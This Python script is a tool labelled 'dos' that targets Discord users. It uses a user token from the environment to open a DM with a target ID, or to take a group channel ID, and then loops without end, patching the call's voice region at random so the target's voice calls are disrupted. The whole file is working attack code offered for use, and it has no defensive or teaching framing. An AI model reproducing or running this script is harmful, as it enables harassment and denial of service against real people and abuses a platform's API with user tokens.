from Resources import *
import httpx
from colorama import Fore as coloring
import random
import os
import time
import threading
import json
from dotenv import load_dotenv
load_dotenv()
#####################################################
class dos:
        def dminit(port, token):
            res = httpx.post("https://discord.com/api/v9/users/@me/channels", json={ 'recipients': [port]}, headers={'authorization': token})
            try:
              ideyee = res.json()['id']
              return ideyee
            except:
                print(f"{coloring.RED}「Invalid ID Target Inputted」{coloring.RESET}")

        def execute(port, reg, token):
            r = httpx.patch(url=f"https://discord.com/api/v9/channels/{port}/call", json={'region':reg}, headers={'authorization': token})
            if r.status_code == 204:
              print(f"{coloring.LIGHTGREEN_EX}「Request Successful: {r.status_code}」{coloring.RESET}")
            else: 
                print(r.json())
                print(f"{coloring.RED}「Request Status: {r.status_code}」{coloring.RESET}")

        def dmdos(banana, reg, token):
                s = httpx.patch(url=f"https://discord.com/api/v9/channels/{banana}/call", json={'region':reg}, headers={'authorization': token})
                if s.status_code == 204:
                    print(f"{coloring.LIGHTGREEN_EX}「Request Successful: {s.status_code}」{coloring.RESET}")
                else: 
                    print(f"{coloring.RED}「Request Status: {s.status_code}」{coloring.RESET}")
        #####################################################
def first(choice, targer):
    regions = ["brazil", "hongkong", "europe", "india", 'japan', 'russia', 'singapore', 'sydney']
    token = os.getenv("TOKEN")
    print("\n")
    if choice == "dm":
        banana = dos.dminit(targer, token)
        if banana is not None:
            while True: 
                reg = random.choice(regions)
                threading.Thread(target=dos.dmdos(banana, reg, token)).start()
        else:
            return
    elif choice == "gc":
        while True:
            reg = random.choice(regions)
            threading.Thread(target=dos.execute(targer, reg, token)).start()
    else:
        print(f"{coloring.RED}「Invalid Command-line Input」{coloring.RESET}\n")
